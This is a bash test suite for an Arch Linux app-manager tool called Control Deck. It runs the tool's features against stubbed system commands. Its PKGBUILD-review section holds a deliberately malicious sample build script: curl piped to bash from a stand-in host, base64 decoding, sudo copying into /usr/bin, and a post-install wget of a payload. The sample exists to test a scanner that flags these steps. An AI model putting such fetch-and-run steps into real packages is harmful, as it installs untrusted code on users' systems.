#!/usr/bin/env bash
# Control Deck test suite.
#
# Runs the backend inside a throw-away $HOME with stubbed system tools
# (pacman, pkexec, flatpak, systemctl, curl, …): no root, no network, and
# nothing on the real system is touched.  Usage:  tests/run.sh
set -u

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CD="$ROOT/bin/control-deck"
T="$(mktemp -d)"
trap 'pkill -f -- "$T/fake/" 2>/dev/null; rm -rf "$T"' EXIT

export HOME="$T/home"
unset XDG_DATA_HOME XDG_CACHE_HOME XDG_CONFIG_HOME CONTROL_DECK_APPS_DIR INSTALL_ANY_APPS_DIR GITHUB_TOKEN
export LC_ALL=C.UTF-8
mkdir -p "$HOME" "$T/bin" "$T/dl" "$T/fake" "$T/sys"
A="$HOME/.local/share/applications"
APPS="$HOME/Applications"

# ---------------------------------------------------------------- stubs ----
stub() { printf '#!/usr/bin/env bash\n%s\n' "$2" > "$T/bin/$1"; chmod +x "$T/bin/$1"; }
stub pkexec 'echo "pkexec $*" >> "'"$T"'/pkexec.log"; exit 1'
stub notify-send 'echo "notify-send $*" >> "'"$T"'/notify.log"'
stub update-desktop-database 'exit 0'
stub curl 'for a in "$@"; do url="$a"; done
case "$url" in
    file://*)    cat "${url#file://}" ;;
    */compare/*) [[ -n "${FAKE_COMPARE:-}" ]] && cat "$FAKE_COMPARE" || exit 22 ;;
    *)           exit 7 ;;
esac'
stub yay 'exit 0'
stub paru 'exit 0'
stub gio 'exit 0'
stub snapper 'echo "snapper $*" >> "'"$T"'/snapper.log"
case "$*" in
    *"--jsonout list"*) [[ -n "${FAKE_SNAPLIST:-}" ]] && cat "$FAKE_SNAPLIST" ;;
esac'
stub gtk-update-icon-cache 'exit 0'
stub xdg-open 'exit 0'
stub checkupdates 'printf "%s" "${FAKE_UPDATES:-}"'
stub ldconfig '[[ "${FAKE_FUSE2:-1}" == 1 ]] && echo "	libfuse.so.2 (libc6,x86-64) => /usr/lib/libfuse.so.2"; exit 0'
stub pacman 'case "$1" in
    -Q)  [[ "$2" == snap-pac && "${FAKE_SNAPPAC:-1}" == 1 ]]; exit $? ;;
    -Fq) [[ "$2" == libgtk-3.so.0 ]] && echo extra/gtk3 ;;
    -Si) [[ "$2" == python-requests ]] && exit 0; exit 1 ;;
    -Qoq) exit 1 ;;
esac
exit 0'
stub flatpak 'case "$1" in
    info) [[ "$2" == --show-permissions ]] && cat "'"$T"'/fp-perms" ;;
    override) echo "flatpak $*" >> "'"$T"'/flatpak.log" ;;
esac
exit 0'
stub systemctl 'echo "systemctl $*" >> "'"$T"'/systemctl.log"
case "$*" in
    *"enable --now"*)  touch "'"$T"'/timer-on" ;;
    *"disable --now"*) rm -f "'"$T"'/timer-on" ;;
    *is-enabled*)      [[ -f "'"$T"'/timer-on" ]] ;;
    *is-active*)       exit 0 ;;
esac'
export PATH="$T/bin:$PATH"

# -------------------------------------------------------------- helpers ----
pass=0 failed=0
ok()  { pass=$((pass + 1)); printf '  \e[32m✔\e[0m %s\n' "$1"; }
bad() { failed=$((failed + 1)); printf '  \e[31m✘ %s\e[0m\n' "$1"; [[ -n "${2:-}" ]] && printf '      %s\n' "${2:0:400}"; }
eq()  { if [[ "$2" == "$3" ]]; then ok "$1"; else bad "$1" "expected «$3», got «$2»"; fi; }
has() { if [[ "$2" == *"$3"* ]]; then ok "$1"; else bad "$1" "«$3» not in: $2"; fi; }
hasnt() { if [[ "$2" != *"$3"* ]]; then ok "$1"; else bad "$1" "«$3» should not be in: $2"; fi; }
yes() { if eval "$2"; then ok "$1"; else bad "$1" "failed: $2"; fi; }
section() { printf '\n\e[1m%s\e[0m\n' "$1"; }
key() { awk -F= -v k="$2" '$1 == k { sub(/^[^=]*=/, ""); print; exit }' "$1"; }
# shellcheck source=bin/control-deck
fn() { ( source "$CD"; "$@" ); }   # call an internal function

# 1x1 PNG
PNG_B64='iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='

# fake AppImage: answers --appimage-extract like the real runtime does
# make_appimage <path> <name> [fuse2]
make_appimage() {
    cat > "$1" <<EOF
#!/usr/bin/env bash
# fake AppImage runtime for tests ${3:+(dlopen libfuse.so.2)}
if [[ "\$1" == --appimage-extract ]]; then
    r=squashfs-root; mkdir -p "\$r/usr/share/icons/hicolor/256x256/apps" "\$r/usr/share/applications"
    printf '[Desktop Entry]\nType=Application\nName=$2\nExec=AppRun --no-sandbox %%U\nIcon=fakeapp\nCategories=Development;\nStartupWMClass=FakeApp\n' \
        > "\$r/usr/share/applications/fakeapp.desktop"
    ln -sf usr/share/applications/fakeapp.desktop "\$r/fakeapp.desktop"
    echo '$PNG_B64' | base64 -d > "\$r/usr/share/icons/hicolor/256x256/apps/fakeapp.png"
    exit 0
fi
exec sleep 30
EOF
    chmod +x "$1"
}

desktop() {   # desktop <file> <name> <exec>
    mkdir -p "$(dirname "$1")"
    printf '[Desktop Entry]\nType=Application\nName=%s\nExec=%s\n' "$2" "$3" > "$1"
}

# ==========================================================================
section "CLI"
"$CD" help >/dev/null; eq "help exits 0" "$?" 0
"$CD" nope >/dev/null 2>&1; eq "unknown command exits 2" "$?" 2

section "Format detection & names"
eq "AppImage"          "$("$CD" detect x.AppImage | key /dev/stdin TYPE)" appimage
eq "pacman package"    "$("$CD" detect x-1-1-x86_64.pkg.tar.zst | key /dev/stdin TYPE)" pacman
eq "tarball"           "$("$CD" detect x.tar.gz | key /dev/stdin TYPE)" tar
eq ".deb without debtap is not supported" "$("$CD" detect x.deb | key /dev/stdin SUPPORTED)" no
eq "clean name: version+arch" "$(fn clean_base_name Obsidian-1.6.7-x86_64)" Obsidian
eq "clean name: latest-linux" "$(fn clean_base_name curseforge-latest-linux)" curseforge
eq "slugify" "$(fn slugify 'My Cool App!')" my-cool-app

# ==========================================================================
section "AppImage install (embedded metadata)"
make_appimage "$T/dl/FakeApp-1.2.3-x86_64.AppImage" "Fake App"
"$CD" install "$T/dl/FakeApp-1.2.3-x86_64.AppImage" > "$T/out" 2>&1; eq "install exits 0" "$?" 0
L="$A/appimage-fake-app.desktop"
yes "launcher created with a stable name" "[[ -f '$L' ]]"
yes "AppImage stored as ~/Applications/fake-app.AppImage" "[[ -x '$APPS/fake-app.AppImage' ]]"
eq "real name from embedded .desktop" "$(key "$L" Name)" "Fake App"
eq "embedded arguments kept" "$(key "$L" Exec)" "\"$APPS/fake-app.AppImage\" --no-sandbox %U"
eq "categories"  "$(key "$L" Categories)" "Development;"
eq "WM class"    "$(key "$L" StartupWMClass)" FakeApp
yes "icon extracted (via symlinked .desktop + hicolor)" "[[ -f '$(key "$L" Icon)' ]]"
yes "source file copied, not moved" "[[ -f '$T/dl/FakeApp-1.2.3-x86_64.AppImage' ]]"

section "Edit + reinstall keeps user changes"
cp "$L" "$T/localized.desktop"
printf 'Name[es]=Aplicación\n' >> "$L"
"$CD" edit "$L" NAME="Renamed" CATEGORIES="Game" NODISPLAY=true \
      EXEC="\"$APPS/fake-app.AppImage\" --no-sandbox --ozone-platform=wayland %U" >/dev/null
eq "name changed" "$(key "$L" Name)" Renamed
hasnt "localized Name[es] dropped" "$(cat "$L")" "Name[es]"
eq "categories get a trailing ;" "$(key "$L" Categories)" "Game;"
eq "hidden (NoDisplay)" "$(key "$L" NoDisplay)" true
yes "hidden app still listed (to unhide it)" "\"$CD\" list | jq -e 'any(.[]; .path == \"$L\" and .hidden)' >/dev/null"
make_appimage "$T/dl/FakeApp-2.0.0-x86_64.AppImage" "Fake App"
"$CD" install "$T/dl/FakeApp-2.0.0-x86_64.AppImage" >/dev/null 2>&1
eq "reinstall keeps the new name" "$(key "$L" Name)" Renamed
has "reinstall keeps edited Exec flags" "$(key "$L" Exec)" "--ozone-platform=wayland"
eq "reinstall keeps NoDisplay" "$(key "$L" NoDisplay)" true
"$CD" edit "$L" NODISPLAY=false >/dev/null
eq "unhide removes NoDisplay" "$(key "$L" NoDisplay)" ""

section "List · appinfo · sizes"
LIST="$("$CD" list)"
yes "list is valid JSON" "jq -e 'type == \"array\"' <<<'$LIST' >/dev/null"
eq "AppImage listed with its source" "$(jq -r --arg p "$L" '.[] | select(.path == $p) | .source' <<<"$LIST")" appimage
INFO="$("$CD" appinfo "$L")"
has "appinfo source" "$INFO" "SOURCE=appimage"
has "appinfo autostart off by default" "$INFO" "AUTOSTART=false"
SZ="$("$CD" sizes)"
yes "sizes reports the AppImage size" "jq -e --arg p '$L' '.[\$p].app > 0' <<<'$SZ' >/dev/null"

section "Autostart (opt-in)"
"$CD" autostart "$L" on >/dev/null
AS="$HOME/.config/autostart/appimage-fake-app.desktop"
yes "autostart entry created" "[[ -f '$AS' ]]"
eq "marked as ours" "$(key "$AS" X-ControlDeck-Autostart)" true
eq "status on" "$("$CD" autostart "$L" status)" on
"$CD" autostart "$L" off >/dev/null
yes "our entry removed on off" "[[ ! -f '$AS' ]]"
desktop "$T/sys/selfstart.desktop" "Self Start" "/usr/bin/true"
desktop "$HOME/.config/autostart/selfstart.desktop" "Self Start" "/usr/bin/true"
"$CD" autostart "$T/sys/selfstart.desktop" off >/dev/null
eq "an app's own entry is disabled with Hidden=true" "$(key "$HOME/.config/autostart/selfstart.desktop" Hidden)" true
"$CD" autostart "$T/sys/selfstart.desktop" on >/dev/null
eq "…and re-enabled" "$(key "$HOME/.config/autostart/selfstart.desktop" Hidden)" ""

section "Leftovers + purge uninstall"
mkdir -p "$HOME/.config/FakeApp" "$HOME/.config/keepme" "$HOME/.cache/renamed" "$HOME/.config/hypr"
LO="$("$CD" leftovers "$L")"
has "config dir found by WM class" "$LO" ".config/FakeApp"
has "cache dir found by (edited) name" "$LO" ".cache/renamed"
hasnt "unrelated dir not proposed" "$LO" "keepme"
"$CD" autostart "$L" on >/dev/null
IMG="$(key "$L" X-ControlDeck-File)"; ICON="$(key "$L" Icon)"
"$CD" uninstall "$L" --purge >/dev/null 2>&1; eq "uninstall exits 0" "$?" 0
yes "AppImage deleted" "[[ ! -e '$IMG' ]]"
yes "icon deleted" "[[ ! -e '$ICON' ]]"
yes "launcher deleted" "[[ ! -e '$L' ]]"
yes "its autostart entry deleted" "[[ ! -e '$AS' ]]"
yes "data dirs purged" "[[ ! -e '$HOME/.config/FakeApp' && ! -e '$HOME/.cache/renamed' ]]"
yes "unrelated dirs untouched" "[[ -d '$HOME/.config/keepme' && -d '$HOME/.config/hypr' ]]"

section "Legacy install-any launcher migration"
make_appimage "$APPS/fakeapp-latest-linux.AppImage" "Fake App"
desktop "$A/fakeapp-latest-linux.desktop" "Fake App" "\"$APPS/fakeapp-latest-linux.AppImage\" %U"
echo "X-Created-By=install-any" >> "$A/fakeapp-latest-linux.desktop"
eq "legacy launcher seen as appimage" "$("$CD" list | jq -r '.[] | select(.name == "Fake App") | .source')" appimage
"$CD" install "$APPS/fakeapp-latest-linux.AppImage" >/dev/null 2>&1
yes "legacy launcher removed" "[[ ! -e '$A/fakeapp-latest-linux.desktop' ]]"
yes "file moved to the stable name" "[[ ! -e '$APPS/fakeapp-latest-linux.AppImage' && -f '$APPS/fake-app.AppImage' ]]"
"$CD" uninstall "$A/appimage-fake-app.desktop" >/dev/null 2>&1

section "Tarball with launcher"
mkdir -p "$T/tar/MyTool-2.3.1-linux-x86_64/bin" "$T/tar/MyTool-2.3.1-linux-x86_64/share"
printf '#!/bin/sh\nexit 0\n' > "$T/tar/MyTool-2.3.1-linux-x86_64/bin/mytool"
printf '#!/bin/sh\nexit 0\n' > "$T/tar/MyTool-2.3.1-linux-x86_64/bin/mytool-updater"
chmod +x "$T/tar/MyTool-2.3.1-linux-x86_64/bin/"*
echo "$PNG_B64" | base64 -d > "$T/tar/MyTool-2.3.1-linux-x86_64/share/mytool.png"
(cd "$T/tar" && tar czf "$T/dl/MyTool-2.3.1-linux-x86_64.tar.gz" MyTool-2.3.1-linux-x86_64)
"$CD" install "$T/dl/MyTool-2.3.1-linux-x86_64.tar.gz" >/dev/null 2>&1; eq "tar install exits 0" "$?" 0
TL="$A/tar-mytool.desktop"
eq "launcher points at the main executable" "$(key "$TL" Exec)" "\"$APPS/mytool/bin/mytool\""
yes "tar icon found" "[[ -f '$(key "$TL" Icon)' ]]"
"$CD" uninstall "$TL" >/dev/null 2>&1
yes "tar uninstall removes its folder" "[[ ! -e '$APPS/mytool' && ! -e '$TL' ]]"

# ==========================================================================
section "Launch diagnostics"
fake() { printf '#!/bin/sh\n%s\n' "$2" > "$T/fake/$1"; chmod +x "$T/fake/$1"; desktop "$A/$1.desktop" "$1" "\"$T/fake/$1\" %U"; }
fake lib 'echo "./app: error while loading shared libraries: libgtk-3.so.0: cannot open shared object file" >&2; exit 127'
fake fuse 'echo "dlopen(): error loading libfuse.so.2" >&2; exit 1'
fake sbx 'echo "[1:FATAL:zygote_host_impl_linux.cc] No usable sandbox!" >&2; exit 133'
fake qt 'echo "qt.qpa.plugin: Could not find the Qt platform plugin \"wayland\"" >&2; exit 1'
fake py 'echo "ModuleNotFoundError: No module named '"'"'requests'"'"'" >&2; exit 1'
fake good 'exec sleep 30'
desktop "$A/gone.desktop" gone "/opt/nothing/here %U"

out() { "$CD" launch "$A/$1.desktop" 2>&1; }
O="$(out lib)";  has "missing library → package"   "$O" "FIX=repo:gtk3|"
O="$(out fuse)"; has "FUSE 2 → install fuse2"      "$O" "FIX=repo:fuse2|"
has              "FUSE 2 → run without FUSE"       "$O" "FIX=extractrun|"
O="$(out sbx)";  has "sandbox → --no-sandbox"      "$O" "FIX=nosandbox|"
O="$(out qt)";   has "Qt wayland plugin"           "$O" "FIX=repo:qt6-wayland|"
O="$(out py)";   has "python module → package"     "$O" "FIX=repo:python-requests|"
O="$(out gone)"; has "broken launcher explained"   "$O" "ISSUE=The program doesn't exist"
O="$(out good)"; has "healthy app just launches"   "$O" "▶ Launched: good"
pkill -f -- "$T/fake/good" 2>/dev/null

section "Fixes"
"$CD" fix "$A/sbx.desktop" nosandbox >/dev/null
eq "--no-sandbox inserted after the program" "$(key "$A/sbx.desktop" Exec)" "\"$T/fake/sbx\" --no-sandbox %U"
desktop "$A/envapp.desktop" envapp "env FOO=1 $T/fake/good %U"
"$CD" fix "$A/envapp.desktop" nosandbox >/dev/null
eq "--no-sandbox with an env prefix" "$(key "$A/envapp.desktop" Exec)" "env FOO=1 $T/fake/good --no-sandbox %U"
"$CD" fix "$A/fuse.desktop" extractrun >/dev/null
has "extract-and-run prefix" "$(key "$A/fuse.desktop" Exec)" "env APPIMAGE_EXTRACT_AND_RUN=1 "
FAKE_SNAPPAC=1 "$CD" fix "$A/lib.desktop" repo:gtk3 >/dev/null 2>&1; eq "repo fix fails when pkexec is cancelled" "$?" 4
has "repo fix goes through pkexec" "$(cat "$T/pkexec.log")" "pacman -S --needed --noconfirm -- gtk3"

section "FUSE 2 detection without running the app"
make_appimage "$T/dl/Old-1.0.AppImage" "Old Runtime" fuse2
FAKE_FUSE2=0 "$CD" install "$T/dl/Old-1.0.AppImage" > "$T/out" 2>&1
has "install warns about FUSE 2" "$(cat "$T/out")" "needs FUSE 2"
OL="$A/appimage-old-runtime.desktop"
has "appinfo flags it"         "$(FAKE_FUSE2=0 "$CD" appinfo "$OL")" "FIX=repo:fuse2|"
hasnt "no flag when fuse2 is installed" "$(FAKE_FUSE2=1 "$CD" appinfo "$OL")" "ISSUE="
FAKE_FUSE2=0 "$CD" launch "$OL" >/dev/null 2>&1; eq "launch refuses and explains" "$?" 4
"$CD" fix "$OL" extractrun >/dev/null
hasnt "extract-and-run silences the warning" "$(FAKE_FUSE2=0 "$CD" appinfo "$OL")" "ISSUE="
make_appimage "$T/dl/Old-1.1.AppImage" "Old Runtime" fuse2
"$CD" install "$T/dl/Old-1.1.AppImage" >/dev/null 2>&1
has "extract-and-run survives an update" "$(key "$OL" Exec)" "APPIMAGE_EXTRACT_AND_RUN=1"

# ==========================================================================
section "Flatpak permissions"
cat > "$T/fp-perms" <<'EOF'
[Context]
shared=ipc;network;
sockets=fallback-x11;pulseaudio;wayland;
devices=all;
filesystems=xdg-download;xdg-pictures:ro;~/.steam;

[Environment]
GTK_THEME=Adwaita
EOF
P="$("$CD" fpperms dev.test.App)"
g() { jq -r --arg k "$1" '.[] | select(.key == $k) | .granted' <<<"$P"; }
eq "network granted"        "$(g network)" true
eq "fallback-x11 counts as X11" "$(g x11)" true
eq "audio granted"          "$(g audio)" true
eq "downloads granted"      "$(g downloads)" true
eq "home not granted"       "$(g home)" false
eq "bluetooth not granted"  "$(g bluetooth)" false
"$CD" fpset dev.test.App home on >/dev/null
has "grant home → --filesystem=home" "$(cat "$T/flatpak.log")" "override --user --filesystem=home dev.test.App"
"$CD" fpset dev.test.App x11 off >/dev/null
has "revoke X11 drops both sockets" "$(cat "$T/flatpak.log")" "--nosocket=x11 --nosocket=fallback-x11 dev.test.App"
"$CD" fpset dev.test.App teleport on >/dev/null 2>&1; eq "unknown permission → exit 2" "$?" 2

# ==========================================================================
section "AUR PKGBUILD review"
cat > "$T/evil.PKGBUILD" <<'EOF'
pkgname=totally-legit
source=("http://example.com/app.tar.gz")
sha256sums=('SKIP')
build() {
    curl -s https://example.com/setup.sh | bash
    echo aGVsbG8= | base64 -d > x
    sudo cp x /usr/bin/
    # curl https://commented.out | sh   (comments are ignored)
}
EOF
cat > "$T/evil.install" <<'EOF'
post_install() { wget -q https://example.com/payload -O /tmp/p; }
EOF
S="$("$CD" aurscan "$T/evil.PKGBUILD" "$T/evil.install")"
lv() { jq -r --arg t "$1" '[.[] | select(.text | contains($t)) | .level] | first // "none"' <<<"$S"; }
eq "curl | bash is high"            "$(lv 'pipes it straight into a shell')" high
eq "base64 decoding is high"        "$(lv 'base64')" high
eq "sudo in the build is high"      "$(lv 'sudo')" high
eq "plain HTTP source is medium"    "$(lv 'plain HTTP')" medium
eq "SKIP for a non-VCS source"      "$(lv 'SKIP')" medium
eq ".install downloading is high"   "$(lv '.install script')" high
eq "comments are ignored" "$(jq '[.[] | select(.where == "PKGBUILD:8")] | length' <<<"$S")" 0
cat > "$T/good.PKGBUILD" <<'EOF'
pkgname=yay-bin
source_x86_64=("https://github.com/Jguer/yay/releases/download/v13.0.1/yay_13.0.1_x86_64.tar.gz")
sha256sums_x86_64=('1fdfcb5f7f387bc858d3a5754bdf4e4575bfbddac9560535a716d0ed7189c057')
package() { install -Dm755 yay "$pkgdir/usr/bin/yay"; }
EOF
eq "a clean PKGBUILD has no findings" "$("$CD" aurscan "$T/good.PKGBUILD")" "[]"
cat > "$T/git.PKGBUILD" <<'EOF'
source=("git+https://github.com/foo/bar.git")
sha256sums=('SKIP')
EOF
eq "SKIP is fine for a git source" "$("$CD" aurscan "$T/git.PKGBUILD")" "[]"

# ==========================================================================
section "Background update check (timer)"
eq "timer off by default" "$("$CD" timer status)" off
"$CD" timer on 4 >/dev/null
U="$HOME/.config/systemd/user"
has "service runs notify-updates" "$(cat "$U/control-deck-updates.service")" "control-deck notify-updates"
has "timer interval" "$(cat "$U/control-deck-updates.timer")" "OnUnitActiveSec=4h"
eq "timer status on" "$("$CD" timer status)" on
"$CD" timer on nope >/dev/null 2>&1; eq "bad interval → exit 2" "$?" 2
"$CD" timer off >/dev/null
yes "timer units removed" "[[ ! -e '$U/control-deck-updates.timer' ]]"
eq "timer status off" "$("$CD" timer status)" off
rm -f "$T/notify.log"
FAKE_UPDATES=$'foo 1-1 -> 1-2\n' "$CD" notify-updates
FAKE_UPDATES=$'foo 1-1 -> 1-2\n' "$CD" notify-updates
eq "notifies once per set of updates" "$(grep -c 'update(s) available' "$T/notify.log")" 1
FAKE_UPDATES=$'foo 1-1 -> 1-3\n' "$CD" notify-updates
eq "notifies again when it changes" "$(grep -c 'update(s) available' "$T/notify.log")" 2

# ==========================================================================
section "Clean-up"
desktop "$A/broken.desktop" "Broken" "/opt/removed/app"
C="$("$CD" cleanscan)"
# gone.desktop (from the diagnostics section) is broken too
eq "broken launchers detected" "$(jq -r '.[] | select(.id == "broken") | .count' <<<"$C")" 2
has "…listed by name" "$(jq -r '.[] | select(.id == "broken") | .details' <<<"$C")" "Broken"
"$CD" clean broken >/dev/null
yes "broken launcher moved to the trash" "[[ ! -e '$A/broken.desktop' ]] && ls '$HOME/.local/share/control-deck/trash/'*/broken.desktop >/dev/null"

section "Backup: export / restore"
desktop "$T/sys/term.desktop" "Terminal" "/usr/bin/true"
echo "$PNG_B64" | base64 -d > "$T/icon.png"
"$CD" edit "$T/sys/term.desktop" NAME="My Terminal" ICON="$T/icon.png" >/dev/null 2>&1
yes "system entry edited as a user copy" "[[ -f '$A/term.desktop' && '$(key "$T/sys/term.desktop" Name)' == Terminal ]]"
"$CD" export "$T/backup.json" >/dev/null
yes "export has the edited launcher" "jq -e 'any(.launchers[]; .file == \"term.desktop\" and .icon != null)' '$T/backup.json' >/dev/null"
rm -f "$A/term.desktop" "$HOME/.local/share/icons/control-deck-term.png"
"$CD" restore "$T/backup.json" >/dev/null 2>&1
eq "restore brings the launcher back" "$(key "$A/term.desktop" Name)" "My Terminal"
yes "…with its icon" "[[ -f '$(key "$A/term.desktop" Icon)' ]]"
echo '{}' > "$T/not-a-backup.json"
"$CD" restore "$T/not-a-backup.json" >/dev/null 2>&1; eq "rejects foreign files" "$?" 3

section "History"
H="$("$CD" history)"
yes "history is newest first" "[[ \$(jq -r '.[0].action' <<<'$H') == restore ]]"
yes "history recorded installs and uninstalls" "jq -e 'any(.[]; .action == \"install\") and any(.[]; .action == \"uninstall purge\")' <<<'$H' >/dev/null"


# ==========================================================================
section "Arch news"
cat > "$T/news.xml" <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>Arch Linux: Recent news updates</title>
<item><title>Foo &gt;= 2.0 requires manual intervention</title><link>https://archlinux.org/news/foo/</link><description>&lt;p&gt;Run &lt;code&gt;pacman -Syu foo&lt;/code&gt; before
the upgrade.&lt;/p&gt;</description><pubDate>Tue, 22 Sep 2026 09:09:27 +0000</pubDate></item>
<item><title>Old news</title><link>https://archlinux.org/news/old/</link><description>&lt;p&gt;Nothing to do.&lt;/p&gt;</description><pubDate>Mon, 01 Jun 2026 10:00:00 +0000</pubDate></item>
</channel></rss>
EOF
echo '[2026-08-01T10:00:00+0200] [PACMAN] starting full system upgrade' > "$T/pacman.log"
N="$(CONTROL_DECK_NEWS_URL="file://$T/news.xml" CONTROL_DECK_PACMAN_LOG="$T/pacman.log" "$CD" news)"
eq "two news items" "$(jq length <<<"$N")" 2
eq "entities decoded" "$(jq -r '.[0].title' <<<"$N")" "Foo >= 2.0 requires manual intervention"
eq "summary is plain text" "$(jq -r '.[0].summary' <<<"$N")" "Run pacman -Syu foo before the upgrade."
eq "news after the last upgrade is unread" "$(jq -r '.[0].unread' <<<"$N")" true
eq "older news is read" "$(jq -r '.[1].unread' <<<"$N")" false

section "Version & self-update"
PATH="$T/bin:$PATH" "$ROOT/install.sh" --no-deps >/dev/null 2>&1; eq "install.sh works in a clean HOME" "$?" 0
HEAD_SHA="$(git -C "$ROOT" rev-parse HEAD 2>/dev/null)"
yes "the test checkout is a readable git repo" "[[ -n '$HEAD_SHA' ]]"
eq "installed commit recorded" "$("$CD" version | key /dev/stdin COMMIT)" "$HEAD_SHA"
eq "source repo recorded" "$("$CD" version | key /dev/stdin SRC)" "$ROOT"
yes "GUI is installed last" "[[ \"$(grep -n 'shell.qml\" \"\$HOME' "$ROOT/install.sh" | cut -d: -f1)\" -gt \"$(grep -n 'install.env\"$' "$ROOT/install.sh" | cut -d: -f1)\" ]]"
printf '{"status":"ahead","ahead_by":2,"commits":[{"sha":"aaaaaaa111"},{"sha":"bbbbbbb222"}]}' > "$T/compare.json"
U="$(FAKE_COMPARE="$T/compare.json" "$CD" updates)"
eq "newer version on GitHub is offered" "$(jq -r '.[] | select(.source == "deck") | .new' <<<"$U")" "bbbbbbb (+2)"
printf '{"status":"identical","ahead_by":0,"commits":[]}' > "$T/compare.json"
eq "nothing offered when up to date" "$(FAKE_COMPARE="$T/compare.json" "$CD" updates | jq '[.[] | select(.source == "deck")] | length')" 0

section "Snapshots"
mkdir -p "$T/snapcfg"; echo 'ALLOW_USERS=""' > "$T/snapcfg/root"
export CONTROL_DECK_SNAPPER_DIR="$T/snapcfg"
ST="$(FAKE_SNAPPAC=1 "$CD" snapstatus)"
eq "snapper detected" "$(jq -r .snapper <<<"$ST")" true
eq "can't list without permission" "$(jq -r .canlist <<<"$ST")" false
eq "snap-pac detected" "$(jq -r .snappac <<<"$ST")" true
eq "snap-pac missing detected" "$(FAKE_SNAPPAC=0 "$CD" snapstatus | jq -r .snappac)" false
cat > "$T/snaplist.json" <<'EOF'
{"root":[{"number":0,"type":"single","date":"","description":"current","userdata":null},
 {"number":41,"type":"pre","date":"2026-09-26 11:41:30","description":"pacman -Syu","userdata":null},
 {"number":42,"type":"single","date":"2026-09-26 12:00:00","description":"Control Deck: before fun","userdata":{"important":"yes"}}]}
EOF
SL="$(FAKE_SNAPLIST="$T/snaplist.json" "$CD" snaplist)"
eq "snapshot 0 (current) is skipped" "$(jq length <<<"$SL")" 2
eq "newest first" "$(jq -r '.[0].num' <<<"$SL")" 42
eq "important flag" "$(jq -r '.[0].important' <<<"$SL")" true
"$CD" snaplist >/dev/null 2>&1; eq "no permission → exit 3" "$?" 3
rm -f "$T/pkexec.log"
FAKE_SNAPPAC=0 "$CD" fix "$A/lib.desktop" repo:gtk3 >/dev/null 2>&1
has "without snap-pac a snapshot is taken in the same pkexec call" "$(cat "$T/pkexec.log")" "snapper -c"
rm -f "$T/pkexec.log"
FAKE_SNAPPAC=1 "$CD" fix "$A/lib.desktop" repo:gtk3 >/dev/null 2>&1
hasnt "with snap-pac the deck doesn't duplicate it" "$(cat "$T/pkexec.log")" "snapper"
unset CONTROL_DECK_SNAPPER_DIR

export CONTROL_DECK_PACMAN_DB="$T/pacdb" CONTROL_DECK_SNAPSHOTS_DIR="$T/snaps"
mkdir -p "$T/pacdb" "$T/snaps/7/snapshot$T/pacdb"
for p in foo-1.1-1 bar-2.0-1 newpkg-3-2 lib32-foo-bar-1.2-3; do mkdir "$T/pacdb/$p"; done
for p in foo-1.0-1 bar-2.0-1 gone-1-1 lib32-foo-bar-1.2-3; do mkdir "$T/snaps/7/snapshot$T/pacdb/$p"; done
D="$("$CD" snapdiff 7)"
has "changed package"  "$D" "~ foo  1.0-1 → 1.1-1"
has "removed package"  "$D" "- gone 1-1"
has "added package"    "$D" "+ newpkg 3-2"
hasnt "unchanged package (dashes in the name) not listed" "$D" "lib32-foo-bar"
has "summary" "$D" "Total: 1 added, 1 removed, 1 changed."
"$CD" snapdiff nope >/dev/null 2>&1; eq "bad snapshot number → exit 2" "$?" 2
unset CONTROL_DECK_PACMAN_DB CONTROL_DECK_SNAPSHOTS_DIR
# ==========================================================================
printf '\n\e[1m%d passed, %d failed\e[0m\n' "$pass" "$failed"
[[ $failed -eq 0 ]]
